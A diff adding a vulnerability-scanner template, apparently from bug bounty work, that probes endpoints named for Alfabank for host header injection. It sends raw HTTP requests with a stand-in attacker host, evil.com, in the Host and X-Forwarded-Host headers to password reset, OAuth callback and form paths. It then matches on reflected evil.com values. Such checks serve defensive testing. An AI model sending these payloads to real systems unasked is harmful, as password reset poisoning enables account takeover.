@@ -1,0 +1,44 @@
+id: alfabank-host-header-injection
+
+info:
+  name: Alfabank - Host Header Injection
+  author: bugbounty
+  severity: medium
+  description: Host header injection for password reset poisoning
+  tags: host-header,injection,alfabank
+
+http:
+  - raw:
+      - |
+        POST /password/reset HTTP/1.1
+        Host: evil.com
+        Content-Type: application/x-www-form-urlencoded
+
+        email=victim@test.com
+
+      - |
+        GET /gate/oauth/callback HTTP/1.1
+        Host: evil.com
+
+      - |
+        POST /alfaform/ HTTP/1.1
+        Host: evil.com
+        X-Forwarded-Host: evil.com
+        Content-Type: application/x-www-form-urlencoded
+
+        product=dc-short&email=test@test.com
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "evil.com"
+          - "http://evil.com"
+          - "https://evil.com"
+
+      - type: word
+        part: header
+        words:
+          - "Location: http://evil.com"
+          - "Location: https://evil.com"
